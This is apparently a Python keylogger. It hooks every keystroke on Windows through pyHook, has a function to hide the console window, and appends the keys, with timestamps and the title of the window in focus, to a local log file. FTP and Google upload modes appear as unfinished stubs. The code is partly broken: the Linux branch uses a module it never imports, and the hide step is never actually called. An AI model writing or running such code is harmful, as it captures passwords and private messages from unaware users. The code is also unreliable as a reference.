import pyHook, pythoncom, time, click, win32console, win32gui
from sys import platform

'''
@click.command()
@click.option('--file', '-f', default="c:\\temp\logfile.txt", help="File to output keystrokes to (if running local), "
                                                                   "defaults to c:\\temp\\logfile.txt")
@click.option('--mode', '-m', default="local", help="Where to send log, defaults to local, options are local, ftp, ")
'''

def check_os():
    if platform == "linux" or platform == "linux2":
        print('OS: Linux')
        return 'linux'
    elif platform == "darwin":
        print('OS: Mac')
        return 'mac'
    elif platform == "win32":
        print('OS: Windows')
        return 'windows'
    else:
        print('OS: Unknown')
        return 'unknown'


def hide():
    # hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

def get_window():
    # get title of foreground window and return it
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    '''
    windowTile = "";
    while (True):
        newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow());
        if (newWindowTile != windowTile):
            windowTile = newWindowTile;
            print(windowTile);
    '''


def main():
    hide
    global data
    data = ''
    global mode
    mode = 'local'
    global file
    file = "c:\\temp\logfile.txt"
    return True


def local():
    global data, file
    # check that there is at least 20 chars in data
    if len(data) > 20:
        # write data to file
        with open(file, "a") as f:
            # format output, adding information about which window is in focus at the time and timestamp
            printing = "\n" + str(time.ctime()) + ' - ' + str(get_window()) + ' - ' + str(data)
            f.write(printing)
            # reset value of data
            data = ''
    return True


def ftp():
    print('FTP broken')
    pass


def google():
    print('Google broken')
    pass


# windows event catch
def on_keyboard_event(event):
    global mode, data
    if event.Key == "Return":
        keys = "<Enter>"
    elif event.Key == "Space":
        keys = "<Space>"
    elif event.Key == "Back":
        keys = "<Backspace>"
    else:
        keys = event.Key
    data = data + keys
    if mode == 'local':
        local()
    elif mode == 'ftp':
        ftp()
    elif mode == 'google':
        google()
    return True

#hide()
#data = ''


if __name__ == '__main__':
    main()


if check_os() == 'linux':
    # Linux
    # instantiate HookManager class
    new_hook = pyxhook.HookManager()
    # listen to all keystrokes
    new_hook.KeyDown = on_keyboard_event
    # hook the keyboard
    new_hook.HookKeyboard()
    # start the session
    new_hook.start()
    click.echo('Linux')

elif check_os() == 'windows':
    # Windows
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = on_keyboard_event
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()
    click.echo('Windows')
elif check_os() == 'mac':
    click.echo('Mac')
    pass
elif check_os() == 'unknown':
    click.echo('Unknwon')
    pass
